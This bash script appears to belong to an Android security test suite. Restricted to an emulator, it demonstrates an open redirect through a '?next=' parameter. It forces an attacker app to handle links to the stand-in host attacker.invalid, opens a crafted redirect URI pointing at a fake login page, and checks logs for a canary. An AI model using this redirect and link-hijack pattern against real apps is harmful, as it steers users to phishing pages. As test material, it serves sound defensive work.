#!/usr/bin/env bash
# Threat 3 (SPEC section 2): open redirect through ?next=. EMULATOR ONLY.
# The redirect itself needs only adb. To make the landing visible, the attacker app handles
# https://attacker.invalid, and the script simulates the user having chosen that app for those links
# (otherwise the browser would open them). The setting is undone at the end.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t3: open redirect via ?next= (threat 3) =="
require_emulator; require_victim; require_attacker
undo_selection() {
    if [ "$API" -ge 31 ]; then adb_sh pm set-app-links-user-selection --user 0 --package "$ATTACKER" false attacker.invalid
    else adb_sh pm set-app-link --user 0 "$ATTACKER" undefined; fi
}
CLEANUP_HOOK=undo_selection
if [ "$API" -ge 31 ]; then
    send "pm set-app-links-user-selection --user 0 --package $ATTACKER true attacker.invalid"
else
    send "pm set-app-link --user 0 $ATTACKER always"
fi
reset_state
URI="https://shezguard.example/redirect?next=https%3A%2F%2Fattacker.invalid%2Flogin"
echo "ATTACK: open $URI in the demo app."
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$URI' $VICTIM"
echo "LOOK FOR: 'ShezAttacker ... CANARY-REDIRECT-LANDED on attacker.invalid' (the demo app sent the user there)."
verdict "ShezAttacker.*CANARY-REDIRECT-LANDED" "$VICTIM/\.demo\.RedirectActivity"
